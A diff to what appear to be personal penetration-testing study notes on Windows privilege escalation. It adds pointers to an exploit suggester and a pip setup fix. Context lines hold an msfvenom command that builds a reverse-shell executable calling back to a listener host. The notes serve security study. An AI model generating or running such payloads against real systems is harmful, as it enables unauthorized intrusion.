@@ -2089,6 +2089,15 @@ If this setting is enabled, we could craft an MSI file and run it to elevate our
 	msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.185 LPORT=8888 -f exe -o zen.exe
 	```
 - Kernel Vulnerabilities (https://github.com/SecWiki/windows-kernel-exploits)
+  - Use the Windows Exploit Suggester (input the `systeminfo` as a text file as one of the arguments) (https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+  - Possible fix for potential issue (https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/43)
+  ```
+  wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+
+  python get-pip.py
+
+  python -m pip install --user xlrd==1.1.0
+  ```
 - Refer to PDF
 
 
